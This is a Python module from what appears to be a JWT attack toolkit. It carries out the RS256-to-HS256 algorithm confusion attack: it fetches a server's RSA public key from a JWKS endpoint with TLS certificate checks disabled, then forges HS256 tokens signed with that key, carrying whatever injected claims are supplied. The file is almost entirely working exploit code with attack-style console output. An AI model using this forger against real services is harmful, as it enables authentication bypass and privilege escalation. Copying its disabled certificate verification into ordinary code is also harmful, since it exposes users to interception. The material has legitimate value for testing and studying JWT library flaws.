"""
Attack 2: RS256 → HS256 Algorithm Confusion
--------------------------------------------
If a server uses RS256 and the public key is known/obtainable,
we sign a token with HS256 using the PUBLIC key as the HMAC secret.
Vulnerable libraries verify with verify(token, pubkey) regardless of alg.
"""

import hmac
import hashlib
import json
from .utils import decode_token, b64url_encode, b64url_decode


def fetch_public_key_from_jwks(jwks_url: str) -> str:
    """Attempt to fetch public key PEM from a JWKS endpoint."""
    try:
        import urllib.request
        import ssl

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        with urllib.request.urlopen(jwks_url, context=ctx, timeout=10) as resp:
            jwks = json.loads(resp.read())

        keys = jwks.get("keys", [])
        if not keys:
            return None

        # Try to convert first RSA key to PEM
        key = keys[0]
        if key.get("kty") == "RSA":
            return _rsa_jwk_to_pem(key)
    except Exception as e:
        print(f"  [!] JWKS fetch failed: {e}")
    return None


def _rsa_jwk_to_pem(jwk: dict) -> str:
    """Convert RSA JWK to PEM format (requires cryptography lib)."""
    try:
        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
        from cryptography.hazmat.primitives import serialization
        import base64

        def decode_b64(s):
            s += "=" * (-len(s) % 4)
            return int.from_bytes(base64.urlsafe_b64decode(s), "big")

        n = decode_b64(jwk["n"])
        e = decode_b64(jwk["e"])
        pub = RSAPublicNumbers(e, n).public_key()
        pem = pub.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return pem.decode()
    except ImportError:
        print("  [!] cryptography library not installed — pip install cryptography")
        return None
    except Exception as e:
        print(f"  [!] JWK to PEM conversion failed: {e}")
        return None


def attack_rs_hs_confusion(token: str, public_key: str, modify_payload: dict = None) -> dict:
    """
    Sign a JWT using HS256 with the RSA public key as the HMAC secret.
    
    Args:
        token: Original RS256 JWT
        public_key: RSA public key as PEM string or raw bytes
        modify_payload: Claims to inject/modify
    
    Returns:
        Forged HS256 token dict
    """
    header, payload, _, _ = decode_token(token)

    if modify_payload:
        payload.update(modify_payload)

    # Normalize key — strip/handle PEM or raw
    if isinstance(public_key, str):
        key_bytes = public_key.encode()
    else:
        key_bytes = public_key

    forged_header = dict(header)
    forged_header["alg"] = "HS256"
    if "kid" in forged_header:
        pass  # keep kid — server may need it for key lookup

    h = b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    forged_token = f"{h}.{p}.{b64url_encode(sig)}"

    return {
        "attack": "RS256→HS256 confusion",
        "original_alg": header.get("alg"),
        "forged_alg": "HS256",
        "key_used": public_key[:64].strip() + "..." if len(str(public_key)) > 64 else str(public_key),
        "token": forged_token
    }


def run(token: str, public_key: str = None, jwks_url: str = None,
        claims: dict = None, verbose: bool = True) -> dict:

    if not public_key and jwks_url:
        print(f"  [*] Fetching public key from JWKS: {jwks_url}")
        public_key = fetch_public_key_from_jwks(jwks_url)
        if not public_key:
            print("  [!] Could not retrieve public key")
            return {}

    if not public_key:
        print("  [!] No public key provided. Use --pubkey or --jwks")
        return {}

    result = attack_rs_hs_confusion(token, public_key, modify_payload=claims)

    if verbose:
        print(f"\n[*] RS256→HS256 CONFUSION ATTACK\n")
        print(f"  [+] Original alg : {result['original_alg']}")
        print(f"  [+] Forged alg   : {result['forged_alg']}")
        print(f"  [+] Key used     : {result['key_used']}")
        print(f"  [+] Forged token :\n")
        print(f"      {result['token']}\n")

    return result
